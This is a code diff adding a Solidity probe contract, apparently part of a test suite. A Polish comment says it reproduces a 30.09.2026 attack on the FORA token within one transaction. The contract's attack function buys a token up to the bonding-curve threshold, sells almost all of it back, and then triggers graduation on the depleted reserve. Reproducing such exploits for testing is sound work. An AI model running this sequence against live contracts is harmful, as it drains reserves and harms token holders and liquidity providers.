@@ -334,3 +334,28 @@ contract SwapProbe {
         return "";
     }
 }
+
+/**
+ * Odtworzenie ataku z 30.09.2026 (FORA) w JEDNEJ transakcji: kupno do progu,
+ * sprzedaz prawie wszystkiego z powrotem w zamknieta krzywa, graduacja na
+ * resztkach rezerwy. Pozyczka blyskawiczna jest tu zbedna - liczy sie to, ze
+ * wszystko dzieje sie atomowo, czyli tak, jak musi przy flash loanie.
+ */
+contract GraduationSandwichProbe {
+    ICurvePad public immutable pad;
+
+    constructor(ICurvePad pad_) {
+        pad = pad_;
+    }
+
+    function attack(address token, uint256 keepBps) external payable {
+        pad.buy{value: msg.value}(token, 1, block.timestamp + 600);
+        uint256 bal = IProbeToken(token).balanceOf(address(this));
+        uint256 dump = (bal * (10_000 - keepBps)) / 10_000;
+        IProbeToken(token).approve(address(pad), dump);
+        pad.sell(token, dump, 1, block.timestamp + 600);
+        pad.graduate(token);
+    }
+
+    receive() external payable {}
+}
